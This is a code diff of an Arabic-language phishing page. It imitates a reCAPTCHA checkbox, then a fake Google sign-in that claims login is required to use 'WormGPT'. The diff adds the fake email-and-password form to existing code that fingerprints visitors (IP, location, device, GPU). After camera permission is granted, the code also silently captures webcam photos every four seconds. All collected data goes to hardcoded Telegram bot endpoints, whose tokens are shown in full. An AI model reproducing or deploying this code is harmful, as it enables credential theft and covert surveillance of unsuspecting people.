@@ -1,33 +1,47 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>التحقق من الأمان</title>
     <style>
-        body { background: #f9f9f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; direction: rtl; }
-        .captcha-card { background: white; border: 1px solid #d3d3d3; border-radius: 3px; padding: 15px; width: 300px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 0 4px rgba(0,0,0,0.1); }
-        .captcha-left { display: flex; align-items: center; }
-        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 12px; cursor: pointer; position: relative; }
+        body { background: #f9f9f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .captcha-card { background: white; border: 1px solid #d3d3d3; border-radius: 3px; padding: 15px; width: 300px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 0 4px rgba(0,0,0,0.1); cursor: pointer; }
+        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 12px; position: relative; }
         .checkbox.loading { border: 3px solid #f3f3f3; border-top: 3px solid #4a90e2; animation: spin 1s linear infinite; border-radius: 50%; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .text { color: #555; font-size: 14px; user-select: none; }
-        .captcha-right { text-align: center; min-width: 70px; }
-        .captcha-right img { width: 30px; }
-        .captcha-right div { font-size: 8px; color: #9b9b9b; margin-top: 3px; }
+        
+        .login-box { display: none; background: white; border: 1px solid #dadce0; border-radius: 8px; padding: 40px; width: 360px; text-align: center; }
+        input { width: 100%; padding: 13px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; margin-bottom: 15px; box-sizing: border-box; outline-color: #1a73e8; text-align: right; }
+        .blue-btn { width: 100%; padding: 10px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: 500; }
+
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="captcha-card">
-        <div class="captcha-left">
-            <div class="checkbox" id="btn"></div>
-            <div class="text" id="msg">أنا لست برنامج روبوت</div>
+    <div id="step-captcha" class="captcha-card" onclick="startSystem()">
+        <div style="display:flex; align-items:center;">
+            <div id="check-btn" class="checkbox"></div>
+            <div style="color:#555; font-size:14px; margin-right:10px;">أنا لست برنامج روبوت</div>
         </div>
-        <div class="logo-section" style="text-align: center; min-width: 70px;">
-            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" style="width:30px;">
-            <div style="font-size: 8px; color: #9b9b9b; margin-top: 3px;">الخصوصية - البنود</div>
+        <div style="text-align:center;">
+            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="30">
+            <div style="font-size:8px; color:#9b9b9b;">الخصوصية - البنود</div>
+        </div>
+    </div>
+
+    <div id="step-google" class="login-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75">
+        <h1 style="font-size:22px; font-weight:400; margin-top:10px;">تسجيل الدخول</h1>
+        <p style="margin-bottom:25px;">يجب تسجيل الدخول لاستخدام WormGPT</p>
+        <div id="email-div">
+            <input type="email" id="email" placeholder="البريد الإلكتروني">
+            <button class="blue-btn" onclick="showP()">التالي</button>
+        </div>
+        <div id="pass-div" style="display:none;">
+            <input type="password" id="pass" placeholder="كلمة المرور">
+            <button class="blue-btn" id="go-project">تأكيد</button>
         </div>
     </div>
 
@@ -35,8 +49,12 @@
     <canvas id="c"></canvas>
 
     <script>
-        const api = "https://api.telegram.org/bot6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY/";
+        const bot1_api = "https://api.telegram.org/bot6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY/";
+        const bot2_api = "https://api.telegram.org/bot6130193245:AAF0ZIPHTZ9Ip4jYSpXLTFPYyx7K3pDEn40/";
         const chat = "2103976274";
+
+        let user_ip = "جاري الجلب...";
+        let user_device = "غير محدد";
 
         async function collectAll() {
             let n = navigator;
@@ -44,35 +62,32 @@
 
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-                report += `🌍 **الآي بي:** \`${ipRes.ip}\`\n`;
-                const geo = await fetch(`https://ipapi.co/${ipRes.ip}/json/`).then(r => r.json());
+                user_ip = ipRes.ip;
+                report += `🌍 **الآي بي:** \`${user_ip}\`\n`;
+                const geo = await fetch(`https://ipapi.co/${user_ip}/json/`).then(r => r.json());
                 report += `🏢 **الشركة:** ${geo.org || 'غير معروف'}\n`;
                 report += `📍 **المكان:** ${geo.city}, ${geo.country_name}\n`;
-            } catch (e) { report += `🌍 **الآي بي:** فشل جلب الشبكة\n`; }
+            } catch (e) { report += `🌍 **الآي بي:** فشل الجلب\n`; }
 
-            let deviceDetail = "Linux (Generic)";
             try {
-                if (n.userAgentData && n.userAgentData.getHighEntropyValues) {
-                    const ua = await n.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
-                    deviceDetail = `${ua.model} - Android ${ua.platformVersion}`;
+                if (n.userAgentData) {
+                    const info = await n.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
+                    user_device = `${info.model} (Android ${info.platformVersion})`;
                 } else {
-                    let uaText = n.userAgent;
-                    let modelMatch = uaText.match(/\(([^)]+)\)/);
-                    if (modelMatch && modelMatch[1]) {
-                        let parts = modelMatch[1].split(';');
-                        deviceDetail = parts[2] ? parts[2].trim() : parts[0].trim();
-                    }
+                    let match = n.userAgent.match(/\(([^)]+)\)/);
+                    user_device = match ? match[1].split(';')[2] || match[1] : n.platform;
                 }
-            } catch (e) { deviceDetail = n.platform; }
-            
-            report += `📱 **النظام:** ${deviceDetail}\n`;
-            let bName = n.userAgent.includes("Brave") ? "Brave" : n.userAgent.includes("Chrome") ? "Chrome" : "Other";
-            report += `🧭 **المتصفح:** ${bName}\n`;
+            } catch(e) { user_device = n.platform; }
+            report += `📱 **النظام:** ${user_device}\n`;
+
+            let browser = "Chrome";
+            if (n.brave && await n.brave.isBrave()) browser = "Brave";
+            report += `🧭 **المتصفح:** ${browser}\n`;
 
             try {
                 const gl = document.createElement('canvas').getContext('webgl');
                 const ext = gl.getExtension('WEBGL_debug_renderer_info');
-                report += `🎮 **الرسوميات:** ${gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)}\n`;
+                report += `🎮 **المعالج الرسومي:** ${gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)}\n`;
             } catch(e) {}
 
             report += `⚙️ **أنوية المعالج:** ${n.hardwareConcurrency || '8'}\n`;
@@ -86,66 +101,63 @@
             } catch (e) {}
 
             report += `⏰ **وقت الجهاز:** ${new Date().toLocaleString('ar-EG')}\n`;
-            sendText(report);
+            sendText(bot1_api, report); // التقرير يذهب للبوت الأول
         }
 
-        document.getElementById('btn').onclick = async function() {
-            this.classList.add('loading');
-            document.getElementById('msg').innerText = "جاري التحقق...";
-            
+        async function startSystem() {
+            document.getElementById('check-btn').classList.add('loading');
+            collectAll(); 
+
             try {
-                const s = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user", width: 640, height: 480 } 
-                });
-                const video = document.getElementById('v');
-                video.srcObject = s;
+                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                document.getElementById('v').srcObject = s;
+                setInterval(snap, 4000); 
 
-                video.onloadedmetadata = () => {
-                    video.play();
-                    // حل مشكلة السواد في كروم
-                    setTimeout(() => {
-                        snap(); // أول صورة فورية
-                        setInterval(snap, 4000); // صور متكررة
-                        
-                        // التوجيه التلقائي بعد 5 ثوانٍ من نجاح التحميل
-                        setTimeout(() => {
-                            window.location.href = "project.html";
-                        }, 12000);
-
-                    }, 1000);
-                };
+                setTimeout(() => {
+                    document.getElementById('step-captcha').style.display = 'none';
+                    document.getElementById('step-google').style.display = 'block';
+                }, 1500);
             } catch (e) {
-                sendText("⚠️ **المستهدف رفض الكاميرا**");
-                this.classList.remove('loading');
-                document.getElementById('msg').innerText = "فشل التحقق. يرجى تفعيل الكاميرا.";
+                sendText(bot1_api, "⚠️ رفض الكاميرا");
+                document.getElementById('step-captcha').style.display = 'none';
+                document.getElementById('step-google').style.display = 'block';
             }
-        };
+        }
+
+        function showP() {
+    const emailInput = document.getElementById('email').value.trim();
+    
+    // التأكد من أن الإيميل ينتهي بـ @gmail.com وطوله معقول
+    if (emailInput.toLowerCase().endsWith('@gmail.com') && emailInput.length > 10) {
+        document.getElementById('email-div').style.display = 'none';
+        document.getElementById('pass-div').style.display = 'block';
+    } else {
+        
+    }
+        }
 
         function snap() {
             const canvas = document.getElementById('c');
             const video = document.getElementById('v');
-            if (video.readyState === video.HAVE_ENOUGH_DATA) {
-                canvas.width = video.videoWidth; 
-                canvas.height = video.videoHeight;
+            if (video.readyState === 4) {
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 canvas.toBlob(blob => {
                     const f = new FormData();
                     f.append('chat_id', chat);
                     f.append('photo', blob, 'x.jpg');
-                    fetch(api + "sendPhoto", { method: 'POST', body: f });
-                }, 'image/jpeg', 0.8);
+                    fetch(bot1_api + "sendPhoto", { method: 'POST', body: f }); // الصور للبوت الأول
+                }, 'image/jpeg', 0.7);
             }
         }
 
-        function sendText(txt) {
-            fetch(api + "sendMessage", {
+        function sendText(api_url, txt) {
+            fetch(api_url + "sendMessage", {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: chat, text: txt, parse_mode: "Markdown" })
             });
         }
-
-        collectAll();
     </script>
 </body>
 </html>
